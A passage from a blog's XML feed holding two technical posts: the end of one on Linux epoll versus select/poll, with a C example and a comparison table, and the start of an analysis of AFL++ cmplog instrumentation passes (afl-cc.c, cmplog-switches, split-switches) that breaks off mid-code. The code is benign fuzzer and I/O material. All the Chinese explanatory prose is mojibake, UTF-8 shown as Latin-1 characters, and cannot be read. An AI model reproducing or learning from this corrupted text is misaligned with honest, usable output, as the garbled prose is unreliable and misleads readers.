setï¼‰ï¼šè¿›ç¨‹æ³¨å†Œç›‘è§†çš„æ–‡ä»¶æè¿°ç¬¦é›†åˆ</li><li>ready listï¼šå·²ç»å‡†å¤‡å¥½ç”¨äºI/Oæ“ä½œçš„æ–‡ä»¶æè¿°ç¬¦é›†åˆï¼Œæ˜¯interest listçš„ä¸€ä¸ªå­é›†</li></ul></li><li><p>åˆ›å»ºå¹¶ç®¡ç†epollå®ä¾‹çš„ç³»ç»Ÿè°ƒç”¨æœ‰ï¼š</p><ol><li>epoll_createï¼ˆepoll_create1ï¼‰ï¼šåœ¨å†…æ ¸ä¸­åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡ï¼ˆi.e. å®ä¾‹ï¼‰</li><li>epoll_ctlï¼šä»ä¸Šä¸‹æ–‡ä¸­æ·»åŠ æˆ–è€…åˆ é™¤æ–‡ä»¶æè¿°ç¬¦</li><li>epoll_waitï¼š ç­‰å¾…ä¸Šä¸‹æ–‡ä¸­çš„äº‹ä»¶</li></ol></li><li><p>æ°´å¹³è§¦å‘ï¼ˆLevel-triggeredï¼Œ<strong>LT</strong>ï¼‰ å’Œ è¾¹ç¼˜è§¦å‘ï¼ˆedge-triggeredï¼Œ<strong>ET</strong>ï¼‰</p><ul><li><p>ä¸¤ç§äº‹ä»¶è§¦å‘æœºåˆ¶</p></li><li><p>å‡è®¾ä¸€ä¸ªåœºæ™¯ï¼š</p><ol><li>åœ¨ç®¡é“çš„<strong>è¯»</strong>æ–¹çš„æ–‡ä»¶æè¿°ç¬¦ (rfd) å·²ç»è¢«æ³¨å†Œåˆ°epollå®ä¾‹ä¸­</li><li>åœ¨ç®¡é“å¦ä¸€ä¸ªå†™æ–¹å¾€ç®¡é“ä¸­å†™å…¥2KBçš„æ•°æ®</li><li>è°ƒç”¨epoll_wait()ï¼Œå…¶å°†è¿”å›rfdä½œä¸ºå°±ç»ªæ–‡ä»¶æè¿°ç¬¦</li><li>ç®¡é“è¯»æ–¹ä»rfdä¸­è¯»å…¥1KBæ•°æ®</li><li>å†æ¬¡è°ƒç”¨epoll_wait()</li></ol><p>å¦‚æœåœ¨ä¸Šè¿°åœºæ™¯ä¸­rfdæ–‡ä»¶æè¿°ç¬¦æ·»åŠ äº†<code>EPOLLET</code>ï¼ˆè¾¹ç¼˜è§¦å‘ï¼‰çš„æ ‡å¿—ï¼Œé‚£ä¹ˆåœ¨Step 5ä¸­çš„<code>epoll_wait()</code>å°†ä¼šè¢«é˜»å¡ï¼Œå°½ç®¡ç®¡é“ä¸­è¿˜æœ‰1KBå­—èŠ‚æœªè¯»ã€‚åŸå› åœ¨äºè¾¹ç¼˜è§¦å‘ä»…åœ¨<strong>è¢«ç›‘æ§çš„æ–‡ä»¶æè¿°ç¬¦å‘ç”Ÿæ”¹å˜æ—¶</strong>æ‰ä¼šä¼ é€’äº‹ä»¶ï¼›å½“ä½¿ç”¨ä¸€ä¸ªæ°´å¹³è§¦å‘æœºåˆ¶æ—¶ï¼ˆé»˜è®¤ï¼Œä¸æŒ‡å®š<code>EPOLLET</code>ï¼‰ï¼ŒæœåŠ¡å™¨ç«¯ä¸æ–­åœ°ä»<code>epoll_wait()</code>è°ƒç”¨ä¸­å”¤é†’ï¼Œç›´åˆ°å†…æ ¸ç¼“å†²åŒºè¢«è¯»å®Œæ‰ç»“æŸã€‚è¿™æ ·èƒ½ä¿è¯è®©æˆ‘ä»¬çŸ¥é“æœ‰å“ªäº›æ•°æ®éœ€è¦è¯»å–ã€‚</p></li></ul></li><li><p><span class="github-emoji"><span>ğŸŒ°</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f330.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ä¿®æ”¹ä¸Šè¿°çš„ä¾‹å­ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/epoll.h&gt;</span></span><br>...<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">events</span>[5];</span><br>  <span class="hljs-type">int</span> epfd = epoll_create(<span class="hljs-number">10</span>);<br>  ...<br>  ...<br>  <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++) <br>  {<br>    <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">ev</span>;</span><br>    <span class="hljs-built_in">memset</span>(&amp;client, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (client));<br>    addrlen = <span class="hljs-keyword">sizeof</span>(client);<br>    ev.data.fd = accept(sockfd,(<span class="hljs-keyword">struct</span> sockaddr*)&amp;client, &amp;addrlen);<br>    ev.events = EPOLLIN;<br>    epoll_ctl(epfd, EPOLL_CTL_ADD, ev.data.fd, &amp;ev);  <span class="hljs-comment">// å°†äº‹ä»¶æ·»åŠ åˆ°epollå®ä¾‹ä¸­</span><br>  }<br>  <br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"round again"</span>);<br>  nfds = epoll_wait(epfd, events, <span class="hljs-number">5</span>, <span class="hljs-number">10000</span>);   <span class="hljs-comment">// wait</span><br><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;nfds;i++) {   <span class="hljs-comment">// éå†å°±ç»ªäº‹ä»¶ï¼Œå°±ç»ªäº‹ä»¶å·²æ›´æ–°åˆ°eventsä¸­ï¼Œå–å‡ºç›¸åº”çš„æ–‡ä»¶æè¿°ç¬¦</span><br><span class="hljs-built_in">memset</span>(buffer,<span class="hljs-number">0</span>,MAXBUF);<br>read(events[i].data.fd, buffer, MAXBUF);<br><span class="hljs-built_in">puts</span>(buffer);<br>}<br>  }<br></code></pre></td></tr></tbody></table></figure></li></ul><h3 id="å°ç»“-2"><a href="#å°ç»“-2" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p><strong>Epoll() <span class="github-emoji"><span>ğŸ†š</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f19a.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> Select()/Poll()</strong></p><ul><li><p><code>select()</code>/<code>poll()</code>ä»…æä¾›ä¸€ä¸ªAPIï¼ˆå½“ç„¶ä¹Ÿæä¾›äº†ä¸€äº›å®å®šä¹‰ï¼‰ï¼Œè€Œ<code>epoll()</code>æä¾›äº†ä¸‰ä¸ªAPI</p></li><li><table><thead><tr><th>[10]</th><th><code>select()</code></th><th><code>poll()</code></th><th><code>epoll()</code></th></tr></thead><tbody><tr><td><strong>æœ€å¤§è¿æ¥æ•°</strong></td><td>1024<br>ã€æ•°ç»„ã€‘</td><td>ä¸æ“ä½œç³»ç»Ÿæœ‰å…³<br>ã€é“¾è¡¨ã€‘</td><td>ä¸æ“ä½œç³»ç»Ÿæœ‰å…³<br></td></tr><tr><td><strong>FDæ¿€å¢åå¸¦æ¥çš„I/Oæ•ˆç‡é—®é¢˜</strong></td><td>O(n) çº¿æ€§ä¸‹é™</td><td>O(n) çº¿æ€§ä¸‹é™</td><td>ä¸æ´»è·ƒsocketæ•°æ®æœ‰å…³</td></tr><tr><td><strong>æ¶ˆæ¯ä¼ é€’æ–¹å¼</strong></td><td>å†…æ ¸éœ€è¦å°†æ¶ˆæ¯ä¼ é€’åˆ°ç”¨æˆ·ç©ºé—´ï¼Œ<br>éƒ½éœ€è¦å†…æ ¸æ‹·è´åŠ¨ä½œ</td><td>åŒ<code>select()</code></td><td>é€šè¿‡å†…æ ¸å’Œç”¨æˆ·ç©ºé—´å…±äº«ä¸€å—å†…å­˜æ¥å®ç°çš„<br>mmap()æ–‡ä»¶æ˜ å°„å†…å­˜åŠ é€Ÿä¸å†…æ ¸ç©ºé—´çš„æ¶ˆæ¯ä¼ é€’</td></tr><tr><td><strong>éå†å°±ç»ªæ–‡ä»¶æè¿°ç¬¦çš„æ–¹å¼</strong></td><td>åŸºäºè½®è¯¢æœºåˆ¶</td><td>åŸºäºè½®è¯¢æœºåˆ¶</td><td>åŸºäºæ“ä½œç³»ç»Ÿçš„I/Oé€šçŸ¥æœºåˆ¶</td></tr></tbody></table></li><li><p><code>epoll()</code>ä»…æ”¯æŒlinuxï¼Œè·¨å¹³å°å¯èƒ½å­˜åœ¨ä¸å…¼å®¹çš„é—®é¢˜</p></li></ul><h2 id="link-Reference"><a href="#link-Reference" class="headerlink" title=":link: Reference:"></a><span class="github-emoji"><span>ğŸ”—</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f517.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> Reference:</h2><ol><li><a href="https://juejin.cn/post/7243609307856683067">I/Oå¤šè·¯å¤ç”¨çš„ä¸‰ç§å®ç° - æ˜é‡‘ (juejin.cn)</a></li><li><a href="https://devarea.com/linux-io-multiplexing-select-vs-poll-vs-epoll/">Linux â€“ IO Multiplexing â€“ Select vs Poll vs Epoll â€“ Developers Area (devarea.com)</a></li><li><a href="https://linux.die.net/man/2/select">select(2): synchronous I/O multiplexing - Linux man page (die.net)</a></li><li><a href="https://man7.org/linux/man-pages/man2/select.2.html">select(2) - Linux manual page (man7.org)</a></li><li><a href="https://man7.org/linux/man-pages/man2/poll.2.html">poll(2) - Linux manual page (man7.org)</a></li><li><a href="https://man7.org/linux/man-pages/man7/epoll.7.html">https://man7.org/linux/man-pages/man7/epoll.7.html</a></li><li><a href="https://man7.org/linux/man-pages/man2/epoll_create.2.html">https://man7.org/linux/man-pages/man2/epoll_create.2.html</a></li><li><a href="https://man7.org/linux/man-pages/man2/epoll_ctl.2.html">https://man7.org/linux/man-pages/man2/epoll_ctl.2.html</a></li><li><a href="https://man7.org/linux/man-pages/man2/epoll_wait.2.html">https://man7.org/linux/man-pages/man2/epoll_wait.2.html</a></li><li><a href="https://blog.csdn.net/qq_41951923/article/details/107886934">selectã€pollå’Œepoll_epollæœ€å¤§è¿æ¥æ•°_Cudi_çš„åšå®¢-CSDNåšå®¢</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>å¤šè·¯å¤ç”¨</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFLplusplus cmplogæ’æ¡©è§£æ</title>
    <link href="/2023/04/20/AFLplusplus-cmplog%E6%8F%92%E6%A1%A9%E8%A7%A3%E6%9E%90/"/>
    <url>/2023/04/20/AFLplusplus-cmplog%E6%8F%92%E6%A1%A9%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="AFL-â€™s-Cmplogæ’æ¡©"><a href="#AFL-â€™s-Cmplogæ’æ¡©" class="headerlink" title="AFL++â€™s Cmplogæ’æ¡©"></a>AFL++â€™s Cmplogæ’æ¡©</h1><h2 id="1-æºç è§£æ"><a href="#1-æºç è§£æ" class="headerlink" title="1. æºç è§£æ"></a>1. æºç è§£æ</h2><h3 id="afl-cc-c"><a href="#afl-cc-c" class="headerlink" title="afl-cc.c"></a>afl-cc.c</h3><ul><li>ä»£ç ç‰‡æ®µï¼š</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (cmplog_mode) {<br><br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-fno-inline"</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> LLVM_MAJOR &gt;= 11                                <span class="hljs-comment">/* use new pass manager */</span></span><br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-fexperimental-new-pass-manager"</span>;<br>      cc_params[cc_par_cnt++] =<br>          alloc_printf(<span class="hljs-string">"-fpass-plugin=%s/cmplog-switches-pass.so"</span>, obj_path);<br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-fexperimental-new-pass-manager"</span>;<br>      cc_params[cc_par_cnt++] =<br>          alloc_printf(<span class="hljs-string">"-fpass-plugin=%s/split-switches-pass.so"</span>, obj_path);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-Xclang"</span>;<br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-load"</span>;<br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-Xclang"</span>;<br>      cc_params[cc_par_cnt++] =<br>          alloc_printf(<span class="hljs-string">"%s/cmplog-switches-pass.so"</span>, obj_path);<br><br>      <span class="hljs-comment">// reuse split switches from laf</span><br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-Xclang"</span>;<br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-load"</span>;<br>      cc_params[cc_par_cnt++] = <span class="hljs-string">"-Xclang"</span>;<br>      cc_params[cc_par_cnt++] =<br>          alloc_printf(<span class="hljs-string">"%s/split-switches-pass.so"</span>, obj_path);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    }<br></code></pre></td></tr></tbody></table></figure><ul><li><code>cmplog-switches-pass.so</code>å’Œ<code>split-switches-pass.so</code>æ˜¯ä¸¤ä¸ªå…³é”®çš„åŠ¨æ€å…±äº«åº“</li></ul><h3 id="cmplog-switches-pass-cc"><a href="#cmplog-switches-pass-cc" class="headerlink" title="cmplog-switches-pass.cc"></a>cmplog-switches-pass.cc</h3><ul><li><p>CmplogSwitchesç±»ï¼š</p><ul><li><p>æ„é€ å‡½æ•°ï¼šinitInstrumentList()  ==&gt; ä»ç¯å¢ƒå˜é‡ <code>AFL_LLVM_ALLOWLIST</code>/<code>AFL_LLVM_DENYLIST</code> <strong>è§£æ</strong>ç™½åå•/é»‘åå•</p></li><li><p><code>runOnModule() / run()</code> (LLVM &gt;= 11)</p></li><li><p><code>getPassName()</code>  ==&gt;  è¿”å›å­—ç¬¦ä¸² â€œcmplog switch splitâ€ï¼Œè¡¨ç¤ºè¯¥Passåå­—</p></li><li><p>ç§æœ‰æ–¹æ³•ï¼š<code>hookInstrs()</code> ?</p></li></ul></li><li><p><code>hookInstrs()</code>ï¼š</p><ul><li><p>ä»£ç ç‰‡æ®µï¼š</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">if</span> LLVM_VERSION_MAJOR &gt;= 9</span><br>  FunctionCallee<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  Constant *<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      c1 = M.<span class="hljs-built_in">getOrInsertFunction</span>(<span class="hljs-string">"__cmplog_ins_hook1"</span>, VoidTy, Int8Ty, Int8Ty,<br>                                 Int8Ty<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> LLVM_VERSION_MAJOR &lt; 5</span><br>                                 ,<br>                                 <span class="hljs-literal">NULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      );<br>...<br></code></pre></td></tr></tbody></table></figure></li><li><p>c1ã€c2ã€c4ã€c8 ==&gt; <code>__cmplog_ins_hook1()</code> ã€<code>__cmplog_ins_hook2()</code> ã€<code>__cmplog_ins_hook4()</code>ã€<code>__cmplog_ins_hook8()</code></p><ul><li>hookå‡½æ•°åœ¨<code>afl-compiler-rt.o.c</code>ä¸­è¢«å®šä¹‰</li><li>è¿™é‡Œåˆ›å»ºç›¸åº”çš„å‡½æ•°å‡½æ•°</li><li>æ’æ¡©å‡½æ•°åˆ†æ <span class="github-emoji"><span>âœ…</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2705.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></li></ul></li><li><p><code>__afl_cmp_map</code>ï¼š</p><ul><li>cmpå¼•å…¥çš„ä½å›¾</li><li>ä½œç”¨ï¼Ÿ</li></ul></li><li><p>éå†IRä¸­æ‰€æœ‰SwitchInstæŒ‡ä»¤ï¼Œå°†<strong>NumCases&gt;1</strong>çš„æŒ‡ä»¤ä¿å­˜åˆ°switcheså‘é‡ä¸­ï¼Œè°ƒç”¨vectorçš„erase()å’Œstd::remove()å®ŒæˆSwitchInstæŒ‡ä»¤çš„å»é‡</p></li><li><p>ç„¶åéå†æ¯ä¸€ä¸ªSwitchInstæŒ‡ä»¤ï¼ˆSIï¼‰ï¼š</p><ul><li>è·³è¿‡SIå½“ï¼š1. æ•´æ•°æ¯”ç‰¹å®½åº¦&lt;16çš„æ¡ä»¶åˆ†æ”¯ï¼ˆå¤ªç®€å•äº†ï¼Œå¾ˆå®¹æ˜“å˜å¼‚åˆ°ï¼‰ æˆ– 2. Caseæ•°ä¸º0ï¼Ÿ</li><li>å½“æ¯”ç‰¹å®½åº¦æ¨¡8ä¸ä¸º0æ—¶ï¼Œæ¯”ç‰¹å®½åº¦å–å€¼å‘ä¸Šå–æ•´ä¸º8çš„æ•´æ•°å€ï¼ŒåŒæ—¶éœ€è¦åšå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼ˆcastï¼‰</li><li>è¿›è¡Œæ’æ¡©ï¼Œä¸»è¦å°±æ˜¯å°†<strong>æ¡ä»¶å€¼</strong>ã€<strong>caseæ¯”è¾ƒå€¼</strong>å’Œ<strong>ä¸€ä¸ªå¸¸æ•°1</strong>ä¼ é€’ç»™hookå‡½æ•°ï¼Œä¼ªä»£ç å¤§è‡´å¦‚ä¸‹ï¼š</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span>(__afl_cmp_map){<br>    <span class="hljs-comment">// æ˜¯å¦éœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢?</span><br>    <span class="hljs-comment">// e.g. for case 1:</span><br>    __cmplog_ins_hook1((cast_size) condition, (cast_size) caseValue1, <span class="hljs-number">1</span>);<br>    __cmplog_ins_hook2((cast_size) condition, (cast_size) caseValue2, <span class="hljs-number">1</span>);<br>    ...<br>}<br></code></pre></td></tr></tbody></table></figure></li></ul></li></ul><hr><ul><li><code>runOnModule()</code><ul><li>è°ƒç”¨<code>hookInstrs()</code>å‡½æ•°</li></ul></li></ul><h3 id="split-switches-pass-so-cc"><a href="#split-switches-pass-so-cc" class="headerlink" title="split-switches-pass.so.cc"></a>split-switches-pass.so.cc</h3><ul><li><p>SplitSwitchesTransformç±»ï¼š</p><ul><li>æ„é€ å‡½æ•°ï¼šinitInstrumentList()  ==&gt; ä»ç¯å¢ƒå˜é‡ <code>AFL_LLVM_ALLOWLIST</code>/<code>AFL_LLVM_DENYLIST</code> <strong>è§£æ</strong>ç™½åå•/é»‘åå•</li><li><code>runOnModule() / run()</code> (LLVM &gt;= 11)</li><li><code>getPassName()</code>  ==&gt;  è¿”å›å­—ç¬¦ä¸² â€œsplits switch constructsâ€ï¼Œè¡¨ç¤ºè¯¥Passåå­—</li><li>CaseExprç»“æ„ä½“ï¼š å»ºç«‹Caseå€¼åˆ°åŸºæœ¬å—çš„æ˜ å°„ï¼ŒCaseVectorç”¨æ¥å­˜å‚¨CaseExprä¿¡æ¯</li><li>ç§æœ‰æ–¹æ³•ï¼š1ã€splitSwitches (bool)ï¼› 2ã€transformCmps (bool)ï¼›3ã€switchConvert<span class="github-emoji"><span>â­</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></li></ul></li><li><p><code>runOnModule() / run()</code>ï¼š</p><ul><li>è°ƒç”¨<code>splitSwitches(&amp;M);</code></li></ul></li><li><p><code>splitSwitches()</code>ï¼š</p><ul><li>éå†æ¨¡å—ä¸­çš„æ‰€æœ‰åŸºæœ¬å—ï¼Œæ‰¾åˆ°æ‰€æœ‰çš„switchæŒ‡ä»¤ï¼Œå¹¶ä¿å­˜åˆ°switchesæ•°ç»„ä¸­ï¼Œè·³è¿‡NumCase&lt;1çš„åˆ†æ”¯</li><li>éå†æ¯ä¸€ä¸ªswitchè¯­å¥ï¼Œå…·ä½“æ¥è¯´ï¼š</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;SI : switches) {<br><br>    BasicBlock *CurBlock = SI-&gt;<span class="hljs-built_in">getParent</span>();<br>    BasicBlock *OrigBlock = CurBlock;<br>    Function *  F = CurBlock-&gt;<span class="hljs-built_in">getParent</span>();<br>    <span class="hljs-comment">/* this is the value we are switching on */</span><br>    Value *     Val = SI-&gt;<span class="hljs-built_in">getCondition</span>();<br>    BasicBlock *Default = SI-&gt;<span class="hljs-built_in">getDefaultDest</span>();<br>    <span class="hljs-type">unsigned</span>    bitw = Val-&gt;<span class="hljs-built_in">getType</span>()-&gt;<span class="hljs-built_in">getIntegerBitWidth</span>();<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        if (!be_quiet)</span><br><span class="hljs-comment">          errs() &lt;&lt; "switch: " &lt;&lt; SI-&gt;getNumCases() &lt;&lt; " cases " &lt;&lt; bitw</span><br><span class="hljs-comment">                 &lt;&lt; " bit\n";</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-comment">/* If there is only the default destination or the condition checks 8 bit or</span><br><span class="hljs-comment">     * less, don't bother with the code below. */</span><br>    <span class="hljs-keyword">if</span> (SI-&gt;<span class="hljs-built_in">getNumCases</span>() &lt; <span class="hljs-number">2</span> || bitw % <span class="hljs-number">8</span> || bitw &gt; <span class="hljs-number">64</span>) {<br><br>      <span class="hljs-comment">// if (!be_quiet) errs() &lt;&lt; "skip switch..\n";</span><br>      <span class="hljs-keyword">continue</span>;<br><br>    }<br><br>    <span class="hljs-comment">/* Create a new, empty default block so that the new hierarchy of</span><br><span class="hljs-comment">     * if-then statements go to this and the PHI nodes are happy.</span><br><span class="hljs-comment">     * if the default block is set as an unreachable we avoid creating one</span><br><span class="hljs-comment">     * because will never be a valid target.*/</span><br>    BasicBlock *NewDefault = <span class="hljs-literal">nullptr</span>;<br>    NewDefault = BasicBlock::<span class="hljs-built_in">Create</span>(SI-&gt;<span class="hljs-built_in">getContext</span>(), <span class="hljs-string">"NewDefault"</span>, F, Default); <span class="hljs-comment">// åœ¨åŸºæœ¬å—Defaultå‰é¢æ’å…¥ä¸€ä¸ªåä¸ºNewDefaultçš„åŸºæœ¬å—ã€‚åˆ›å»ºæ–°åŸºæœ¬å—çš„ç›®çš„æ˜¯å•¥ï¼Ÿ</span><br>    BranchInst::<span class="hljs-built_in">Create</span>(Default, NewDefault);  <span class="hljs-comment">// åˆ›å»º NewDefault ==&gt; Default çš„æ§åˆ¶æµ</span><br><br>    <span class="hljs-comment">/* Prepare cases vector. */</span><br>    CaseVector Cases;<br>    <span class="hljs-keyword">for</span> (SwitchInst::CaseIt i = SI-&gt;<span class="hljs-built_in">case_begin</span>(), e = SI-&gt;<span class="hljs-built_in">case_end</span>(); i != e;<br>         ++i)<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> LLVM_VERSION_MAJOR &gt;= 5</span><br>      Cases.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">CaseExpr</span>(i-&gt;<span class="hljs-built_in">getCaseValue</span>(), i-&gt;<span class="hljs-built_in">getCaseSuccessor</span>()));  <span class="hljs-comment">// getCaseSuccessor() è·å–ä¸caseç›¸å…³è”çš„åŸºæœ¬å—æŒ‡é’ˆ</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>      Cases.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">CaseExpr</span>(i.<span class="hljs-built_in">getCaseValue</span>(), i.<span class="hljs-built_in">getCaseSuccessor</span>()));<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">/* bugfix thanks to pbst</span><br><span class="hljs-comment">     * round up bytesChecked (in case getBitWidth() % 8 != 0) */</span><br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">bool</span>&gt; <span class="hljs-title">bytesChecked</span><span class="hljs-params">((<span class="hljs-number">7</span> + Cases[<span class="hljs-number">0</span>].Val-&gt;getBitWidth()) / <span class="hljs-number">8</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                                   <span class="hljs-literal">false</span>)</span></span>;<br>    BasicBlock *      SwitchBlock =<br>        switchConvert(Cases, bytesChecked, OrigBlock, NewDefault, Val, <span class="hljs-number">0</span>);  <span class="hljs-comment">// è°ƒç”¨switchConvert()</span><br><br>    <span class="hljs-comment">/* Branch to our shiny new if-then stuff... */</span><br>    BranchInst::<span class="hljs-built_in">Create</span>(SwitchBlock, OrigBlock);<span class="hljs-comment">// åˆ›å»ºæ–°çš„æ§åˆ¶æµï¼Œæ–°åˆ›å»ºçš„SwitchBlockå— --&gt; OrigBlock</span><br><br>    <span class="hljs-comment">/* We are now done with the switch instruction, delete it. */</span><br>    CurBlock-&gt;<span class="hljs-built_in">getInstList</span>().<span class="hljs-built_in">erase</span>(SI);<span class="hljs-comment">// åˆ é™¤åŸswitchè¯­å¥ï¼Ÿ ä¹Ÿå°±æ˜¯å°†åŸswitchæ›¿æ¢ä¸ºSwitchBlock</span><br><br>    <span class="hljs-comment">/* we have to update the phi nodes! */</span><span class="hljs-comment">// æ›´æ–°phièŠ‚ç‚¹ï¼Ÿ</span><br>    <span class="hljs-keyword">for</span> (BasicBlock::iterator I = Default-&gt;<span class="hljs-built_in">begin</span>(); I != Default-&gt;<span class="hljs-built_in">end</span>(); ++I) {<br><br>      <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isa</span>&lt;PHINode&gt;(&amp;*I)) { <span class="hljs-keyword">continue</span>; }<br>      PHINode *PN = <span class="hljs-built_in">cast</span>&lt;PHINode&gt;(I);<br><br>      <span class="hljs-comment">/* Only update the first occurrence. */</span><br>      <span class="hljs-type">unsigned</span> Idx = <span class="hljs-number">0</span>, E = PN-&gt;<span class="hljs-built_in">getNumIncomingValues</span>();<br>      <span class="hljs-keyword">for</span> (; Idx != E; ++Idx) {<br><br>        <span class="hljs-keyword">if</span> (PN-&gt;<span class="hljs-built_in">getIncomingBlock</span>(Idx) == OrigBlock) {<br><br>          PN-&gt;<span class="hljs-built_in">setIncomingBlock</span>(Idx, 